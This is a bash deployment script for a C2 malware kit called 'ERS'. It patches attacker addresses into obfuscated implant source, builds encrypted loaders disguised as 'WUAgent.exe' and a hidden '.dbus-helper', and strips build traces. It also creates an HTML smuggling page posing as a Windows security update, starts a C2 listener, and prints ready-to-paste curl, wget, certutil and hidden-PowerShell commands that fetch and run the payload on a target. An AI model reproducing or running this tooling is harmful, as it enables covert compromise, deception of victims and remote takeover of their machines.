#!/bin/bash
# ═══════════════════════════════════════════════════════════════════
#  ERS Automated Deploy — Fully Automated A-to-Z
# ═══════════════════════════════════════════════════════════════════
#
#  Usage:
#    bash deploy.sh                          # interactive menu
#    bash deploy.sh --linux                  # build + serve Linux loader
#    bash deploy.sh --windows                # build + serve Windows loader
#    bash deploy.sh --both                   # build + serve both
#    bash deploy.sh --both --port 9090       # custom serve port
#    bash deploy.sh --both --c2port 4443     # custom C2 callback port
#    bash deploy.sh --both --lhost 10.10.14.5  # manual attacker IP
#
#  Everything is automated:
#    - Auto-detects attacker IP (tun0 → eth0 → wlan0)
#    - Auto-patches C2 address into implant source code
#    - Auto-generates TLS certificates if missing
#    - Builds implant → encrypts → builds loader → serves HTTP
#    - Starts WSS listener for callback
#    - Prints ready-to-paste one-liners
#
#  On target: just double-click the .exe or run the one-liner. Done.

set -e

# ── Config ──────────────────────────────────────────────────────────
ROOT="$(cd "$(dirname "$0")" && pwd)"
SERVE_PORT="${SERVE_PORT:-8080}"
C2_PORT="${C2_PORT:-4443}"
BUILD_LINUX=false
BUILD_WINDOWS=false
INTERACTIVE=true
LHOST=""

# ── Parse args ──────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        --linux)    BUILD_LINUX=true; INTERACTIVE=false ;;
        --windows)  BUILD_WINDOWS=true; INTERACTIVE=false ;;
        --both)     BUILD_LINUX=true; BUILD_WINDOWS=true; INTERACTIVE=false ;;
        --port)     SERVE_PORT="$2"; shift ;;
        --c2port)   C2_PORT="$2"; shift ;;
        --lhost)    LHOST="$2"; shift ;;
        *)          echo "[!] Unknown arg: $1"; exit 1 ;;
    esac
    shift
done

# ── Fix: disable IPv6 to prevent cargo connection failures ─────────
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1 || true
export CARGO_HTTP_CHECK_REVOKE=false
export CARGO_NET_GIT_FETCH_WITH_CLI=true

# ── Detect attacker IP ─────────────────────────────────────────────
detect_ip() {
    if [ -n "$LHOST" ]; then
        echo "$LHOST"
        return
    fi
    for iface in tun0 eth0 wlan0; do
        local ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [ -n "$ip" ]; then echo "$ip"; return; fi
    done
    hostname -I 2>/dev/null | awk '{print $1}'
}

ATTACKER_IP=$(detect_ip)

if [ -z "$ATTACKER_IP" ]; then
    echo "[!] Could not detect IP. Use --lhost YOUR_IP"
    exit 1
fi

# ── Colors ──────────────────────────────────────────────────────────
R='\033[0;31m'  G='\033[0;32m'  Y='\033[0;33m'  B='\033[0;34m'
C='\033[0;36m'  W='\033[1;37m'  D='\033[0;90m'  N='\033[0m'

banner() {
    echo -e "${C}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║       ERS Automated Deploy System v2.0        ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${N}"
}

# ── Interactive menu ────────────────────────────────────────────────
if $INTERACTIVE; then
    banner
    echo -e "  ${W}Attacker IP:${N}  ${G}${ATTACKER_IP}${N}  ${D}(auto-detected, override with --lhost)${N}"
    echo -e "  ${W}C2 port:${N}      ${G}${C2_PORT}${N}"
    echo -e "  ${W}Serve port:${N}   ${G}${SERVE_PORT}${N}"
    echo ""
    echo -e "  ${W}[1]${N} Deploy Linux loader"
    echo -e "  ${W}[2]${N} Deploy Windows loader"
    echo -e "  ${W}[3]${N} Deploy both"
    echo ""
    read -rp "  Select [1-3]: " choice
    case "$choice" in
        1) BUILD_LINUX=true ;;
        2) BUILD_WINDOWS=true ;;
        3) BUILD_LINUX=true; BUILD_WINDOWS=true ;;
        *) echo "[!] Invalid choice"; exit 1 ;;
    esac
    echo ""
fi

# ── Staging directory ──────────────────────────────────────────────
STAGE_DIR="$ROOT/.staging"
mkdir -p "$STAGE_DIR"

# ── Auto-generate TLS certificates ─────────────────────────────────
generate_certs() {
    local dir="$1"
    if [ -f "$dir/cert.pem" ] && [ -f "$dir/key.pem" ]; then
        echo -e "  ${D}TLS certs already exist in $dir${N}"
        return
    fi
    echo -e "  ${Y}[*]${N} Generating TLS certificates..."
    openssl req -x509 -newkey rsa:2048 \
        -keyout "$dir/key.pem" -out "$dir/cert.pem" \
        -days 365 -nodes -subj "/CN=$ATTACKER_IP" 2>/dev/null
    echo -e "  ${G}[+]${N} TLS certs generated: $dir/cert.pem"
}

# ── Auto-patch C2 IP in implant source ──────────────────────────────
patch_c2_windows() {
    local src="$ROOT/ERS-W/src/main.rs"
    local ip_padded="$ATTACKER_IP"

    # Current line looks like: const ENC_C2_HOST: [u8; N] = xor_encode(b"192.168.0.108  ");
    # We need to match the array size (N) to the new IP length (padded with spaces)
    local current_ip=$(grep 'ENC_C2_HOST' "$src" | grep -oP 'b"[^"]*"' | tr -d 'b"')
    local current_len=${#current_ip}

    # Pad new IP with spaces to match current length
    while [ ${#ip_padded} -lt "$current_len" ]; do
        ip_padded="$ip_padded "
    done

    # If new IP is longer than current, we need to update the array size too
    local new_len=${#ip_padded}

    sed -i "s|const ENC_C2_HOST: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_HOST: [u8; $new_len] = xor_encode(b\"$ip_padded\");|" "$src"
    sed -i "s|const ENC_C2_PORT: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_PORT: [u8; ${#C2_PORT}] = xor_encode(b\"$C2_PORT\");|" "$src"

    echo -e "  ${G}[+]${N} Patched ERS-W C2: ${ATTACKER_IP}:${C2_PORT}"
}

patch_c2_linux() {
    local src="$ROOT/ERS/src/main.rs"

    # Linux uses .onion by default, but for direct mode we patch ENC_DEFAULT_IP
    # Check if PROXY_MODE is 0 (direct connection)
    local proxy_mode=$(grep 'const PROXY_MODE' "$src" | grep -oP '\d+')

    if [ "$proxy_mode" = "0" ]; then
        # Direct mode — patch the default IP to our attacker IP
        local current_ip=$(grep 'ENC_DEFAULT_IP' "$src" | grep -oP 'b"[^"]*"' | tr -d 'b"')
        local current_len=${#current_ip}
        local ip_padded="$ATTACKER_IP"

        while [ ${#ip_padded} -lt "$current_len" ]; do
            ip_padded="$ip_padded "
        done
        local new_len=${#ip_padded}

        sed -i "s|const ENC_DEFAULT_IP: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_DEFAULT_IP: [u8; $new_len] = xor_encode(b\"$ip_padded\");|" "$src"
        sed -i "s|const ENC_DEFAULT_PORT: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_DEFAULT_PORT: [u8; ${#C2_PORT}] = xor_encode(b\"$C2_PORT\");|" "$src"
        echo -e "  ${G}[+]${N} Patched ERS C2: ${ATTACKER_IP}:${C2_PORT} (direct mode)"
    else
        echo -e "  ${Y}[*]${N} ERS is in proxy/Tor mode (mode $proxy_mode) — IP not patched"
    fi
}

# ── Build Linux ─────────────────────────────────────────────────────
build_linux() {
    echo -e "${W}══════════════════════════════════════════${N}"
    echo -e "${G}  Building Linux Loader${N}"
    echo -e "${W}══════════════════════════════════════════${N}"

    # Auto-generate TLS certs
    generate_certs "$ROOT/ERS"

    # Auto-patch C2 IP
    patch_c2_linux

    cd "$ROOT/ERS"

    # Always rebuild implant (IP may have changed)
    echo -e "  ${Y}[*]${N} Building ERS implant..."
    cargo build --release 2>&1 | tail -3
    # Find the binary name
    local BIN=$(find target/release -maxdepth 1 -type f -executable ! -name '*.d' | head -1)
    if [ -n "$BIN" ]; then
        cp "$BIN" implant
    fi

    if [ ! -f implant ]; then
        echo -e "  ${R}[!]${N} Implant build failed"
        return 1
    fi

    echo -e "  ${G}[+]${N} Implant: $(du -h implant | cut -f1)"

    # Encrypt + build loader
    cd "$ROOT/ERS/loader"
    echo -e "  ${Y}[*]${N} Encrypting payload (fresh hash)..."
    python3 encrypt_payload.py ../implant

    echo -e "  ${Y}[*]${N} Compiling loader..."
    RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
      cargo build --release 2>&1 | tail -3

    cp target/release/ers-loader "$STAGE_DIR/update"
    chmod +x "$STAGE_DIR/update"

    # Scrub build paths
    python3 -c "
data = bytearray(open('$STAGE_DIR/update','rb').read())
for old, new in [(b'/rustc/',b'\x00'*7),(b'/home/',b'\x00'*6),(b'.cargo/registry/',b'\x00'*16)]:
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
open('$STAGE_DIR/update','wb').write(data)
" 2>/dev/null

    echo -e "  ${G}[+]${N} Linux loader ready: $(du -h "$STAGE_DIR/update" | cut -f1)"
}

# ── Build HTML Smuggling page ───────────────────────────────────────
build_smuggle() {
    local loader="$STAGE_DIR/WUAgent.exe"
    local template="$ROOT/ERS-W/smuggle_template.html"
    local output="$STAGE_DIR/update.html"

    if [ ! -f "$loader" ]; then
        echo -e "  ${Y}[*]${N} Skipping HTML smuggling — no loader built yet"
        return
    fi
    if [ ! -f "$template" ]; then
        echo -e "  ${Y}[*]${N} Skipping HTML smuggling — no template found"
        return
    fi

    echo -e "  ${Y}[*]${N} Building HTML smuggling page..."

    # Base64 encode the loader and inject into template
    python3 -c "
import base64, sys
payload = open('$loader', 'rb').read()
b64 = base64.b64encode(payload).decode()
template = open('$template', 'r').read()
result = template.replace('%%PAYLOAD_B64%%', b64)
open('$output', 'w').write(result)
print(f'  Payload: {len(payload)} bytes -> Base64: {len(b64)} bytes -> HTML: {len(result)} bytes')
"
    echo -e "  ${G}[+]${N} HTML smuggling page ready: $(du -h "$output" | cut -f1)"
}

# ── Build Windows ───────────────────────────────────────────────────
build_windows() {
    echo -e "${W}══════════════════════════════════════════${N}"
    echo -e "${G}  Building Windows Loader${N}"
    echo -e "${W}══════════════════════════════════════════${N}"

    # Auto-generate TLS certs
    generate_certs "$ROOT/ERS-W"

    # Auto-patch C2 IP
    patch_c2_windows

    cd "$ROOT/ERS-W"

    # Always rebuild implant (IP may have changed)
    echo -e "  ${Y}[*]${N} Building ERS-W implant..."
    cargo build --release --target x86_64-pc-windows-gnu 2>&1 | tail -3
    cp target/x86_64-pc-windows-gnu/release/*.exe ers-w.exe 2>/dev/null || true

    if [ ! -f ers-w.exe ]; then
        echo -e "  ${R}[!]${N} Implant build failed"
        return 1
    fi

    echo -e "  ${G}[+]${N} Implant: $(du -h ers-w.exe | cut -f1)"

    # Encrypt + build loader
    cd "$ROOT/ERS-W/loader"
    echo -e "  ${Y}[*]${N} Encrypting payload (fresh hash)..."
    python3 encrypt_payload.py ../ers-w.exe

    echo -e "  ${Y}[*]${N} Cross-compiling loader for Windows..."
    RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
      cargo build --release --target x86_64-pc-windows-gnu 2>&1 | tail -3

    cp target/x86_64-pc-windows-gnu/release/ers-w-loader.exe "$STAGE_DIR/WUAgent.exe"

    # Scrub build paths
    python3 -c "
data = bytearray(open('$STAGE_DIR/WUAgent.exe','rb').read())
for old, new in [(b'/rustc/',b'\x00'*7),(b'/home/',b'\x00'*6),(b'.cargo/registry/',b'\x00'*16)]:
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
open('$STAGE_DIR/WUAgent.exe','wb').write(data)
" 2>/dev/null

    echo -e "  ${G}[+]${N} Windows loader ready: $(du -h "$STAGE_DIR/WUAgent.exe" | cut -f1)"

    # Build HTML smuggling page
    build_smuggle
}

# ── Generate one-liners ────────────────────────────────────────────
print_oneliners() {
    echo ""
    echo -e "${C}══════════════════════════════════════════════════${N}"
    echo -e "${W}  TARGET ONE-LINERS  ${D}(copy-paste to target)${N}"
    echo -e "${C}══════════════════════════════════════════════════${N}"

    if [ -f "$STAGE_DIR/update" ]; then
        echo ""
        echo -e "  ${G}── Linux ──────────────────────────────────────${N}"
        echo ""
        echo -e "  ${W}curl:${N}"
        echo -e "  ${Y}curl -sk http://${ATTACKER_IP}:${SERVE_PORT}/update -o /tmp/.dbus-helper && chmod +x /tmp/.dbus-helper && /tmp/.dbus-helper &${N}"
        echo ""
        echo -e "  ${W}wget:${N}"
        echo -e "  ${Y}wget -q http://${ATTACKER_IP}:${SERVE_PORT}/update -O /tmp/.dbus-helper && chmod +x /tmp/.dbus-helper && /tmp/.dbus-helper &${N}"
        echo ""
        echo -e "  ${W}Download + run + self-delete:${N}"
        echo -e "  ${Y}cd /tmp && curl -sk http://${ATTACKER_IP}:${SERVE_PORT}/update -o .u && chmod +x .u && (nohup ./.u &>/dev/null &) && sleep 1 && rm -f .u${N}"
        echo ""
    fi

    if [ -f "$STAGE_DIR/WUAgent.exe" ]; then
        echo ""
        echo -e "  ${G}── Windows ────────────────────────────────────${N}"
        echo ""
        echo -e "  ${W}PowerShell:${N}"
        echo -e "  ${Y}iwr http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe -OutFile \$env:TEMP\\WUAgent.exe; Start-Process \$env:TEMP\\WUAgent.exe -WindowStyle Hidden${N}"
        echo ""
        echo -e "  ${W}certutil (cmd):${N}"
        echo -e "  ${Y}certutil -urlcache -split -f http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe %TEMP%\\WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
        echo ""
        echo -e "  ${W}PowerShell + self-delete:${N}"
        echo -e "  ${Y}powershell -ep bypass -w hidden -c \"\$p=\$env:TEMP+'\\WUAgent.exe';iwr http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe -OutFile \$p;Start-Process \$p -WindowStyle Hidden;Start-Sleep 5;Remove-Item \$p -Force\"${N}"
        echo ""
        echo -e "  ${W}Or just transfer WUAgent.exe and double-click — everything is inside.${N}"
        echo ""

        if [ -f "$STAGE_DIR/update.html" ]; then
            echo -e "  ${G}── HTML Smuggling (social engineering) ─────────${N}"
            echo ""
            echo -e "  ${W}Send this link to victim:${N}"
            echo -e "  ${Y}http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
            echo ""
            echo -e "  ${D}Victim sees: 'Windows Security Update KB5034441' page with progress bar${N}"
            echo -e "  ${D}.scr file auto-downloads → victim opens it → shell connects back${N}"
            echo ""
        fi
    fi

    echo -e "  ${D}─────────────────────────────────────────────────${N}"
    echo -e "  ${W}HTTP Server:${N} http://${ATTACKER_IP}:${SERVE_PORT}/"
    echo -e "  ${W}C2 Listener:${N} wss://${ATTACKER_IP}:${C2_PORT}/"
    echo ""
}

# ── Start listener ─────────────────────────────────────────────────
start_listener() {
    local listener_dir=""
    if $BUILD_WINDOWS || [ -f "$STAGE_DIR/WUAgent.exe" ]; then
        listener_dir="$ROOT/ERS-W"
    elif $BUILD_LINUX || [ -f "$STAGE_DIR/update" ]; then
        listener_dir="$ROOT/ERS"
    fi

    if [ -z "$listener_dir" ] || [ ! -f "$listener_dir/listener.py" ]; then
        echo -e "  ${Y}[*]${N} No listener.py found, skipping auto-listener"
        return
    fi

    # Make sure certs exist
    generate_certs "$listener_dir"

    echo -e "  ${G}[+]${N} Starting WSS listener on port ${C2_PORT}..."
    cd "$listener_dir"
    python3 listener.py "$C2_PORT" &
    LISTENER_PID=$!
    echo -e "  ${G}[+]${N} Listener PID: $LISTENER_PID"
    cd "$ROOT"
}

# ── Serve files ─────────────────────────────────────────────────────
serve_files() {
    echo ""
    echo -e "${C}══════════════════════════════════════════════════${N}"
    echo -e "${W}  HTTP Server + Listener${N}"
    echo -e "${C}══════════════════════════════════════════════════${N}"
    echo ""

    ls -lh "$STAGE_DIR/" 2>/dev/null
    echo ""

    # Kill any existing server on the ports
    fuser -k "${SERVE_PORT}/tcp" 2>/dev/null || true
    fuser -k "${C2_PORT}/tcp" 2>/dev/null || true
    sleep 0.5

    # Start C2 listener
    start_listener

    echo ""
    print_oneliners

    echo -e "  ${G}[+]${N} HTTP server starting on port ${SERVE_PORT}..."
    echo -e "  ${D}    Press Ctrl+C to stop everything${N}"
    echo ""

    # Serve staged files over HTTP
    cd "$STAGE_DIR"
    python3 -c "
import http.server, socketserver, sys
from datetime import datetime

class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        ts = datetime.now().strftime('%H:%M:%S')
        client = self.client_address[0]
        msg = fmt % args
        if '200' in msg:
            print(f'  \033[0;32m[{ts}]\033[0m {client} => {msg}')
        elif '404' in msg:
            print(f'  \033[0;31m[{ts}]\033[0m {client} => {msg}')
        else:
            print(f'  \033[0;90m[{ts}]\033[0m {client} => {msg}')
        sys.stdout.flush()

    def end_headers(self):
        if not self.path.endswith('.html'):
            self.send_header('Content-Disposition', 'attachment')
        self.send_header('Cache-Control', 'no-store')
        super().end_headers()

PORT = int(sys.argv[1])
with socketserver.TCPServer(('0.0.0.0', PORT), Handler) as httpd:
    httpd.serve_forever()
" "$SERVE_PORT"
}

# ── Cleanup on exit ────────────────────────────────────────────────
cleanup() {
    echo ""
    echo -e "${Y}[*]${N} Cleaning up..."
    rm -rf "$STAGE_DIR"
    if [ -n "$LISTENER_PID" ]; then
        kill "$LISTENER_PID" 2>/dev/null
    fi
    echo -e "${G}[+]${N} Done."
}
trap cleanup EXIT

# ── Main ────────────────────────────────────────────────────────────
banner

echo -e "  ${W}Attacker IP:${N}  ${G}${ATTACKER_IP}${N}"
echo -e "  ${W}C2 port:${N}      ${G}${C2_PORT}${N}"
echo -e "  ${W}HTTP port:${N}    ${G}${SERVE_PORT}${N}"
echo ""

$BUILD_LINUX && build_linux
$BUILD_WINDOWS && build_windows

if ls "$STAGE_DIR"/* &>/dev/null; then
    serve_files
else
    echo -e "${R}[!]${N} Nothing to serve."
    echo -e "${Y}[*]${N} Run with --linux, --windows, or --both"
    exit 1
fi
